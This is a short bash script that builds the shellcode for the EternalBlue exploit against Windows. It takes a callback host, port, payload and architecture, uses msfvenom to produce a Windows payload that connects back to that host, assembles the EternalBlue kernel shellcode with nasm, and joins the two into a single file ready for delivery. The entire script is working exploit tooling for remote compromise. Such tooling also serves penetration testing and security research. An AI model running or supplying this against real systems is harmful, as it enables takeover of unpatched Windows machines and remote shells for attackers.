#!/bin/bash
while getopts ":h:p:s:a:" opt; do
	case $opt in
		h)
			lhost=$OPTARG
		;;
		p)
			lport=$OPTARG
		;;
		s)
			paylo=$OPTARG
		;;
		a)
			arch=$OPTARG
		;;
	esac
done
echo "$lhost $lport $paylo $arch"
path=`pwd`
msf_shellcode=$path"/sc_msf.bin"
shellcode=$path"/sc.bin"
rawAssembly=$path"/assembly/eternalblue_kshellcode_$arch"
rm $rawAssembly 2>/dev/null
msfvenom -p $paylo LHOST=$lhost LPORT=$lport --platform windows -a $arch --format raw -o $msf_shellcode 2>/dev/null
nasm -f bin $rawAssembly.asm
cat $rawAssembly $msf_shellcode > $shellcode
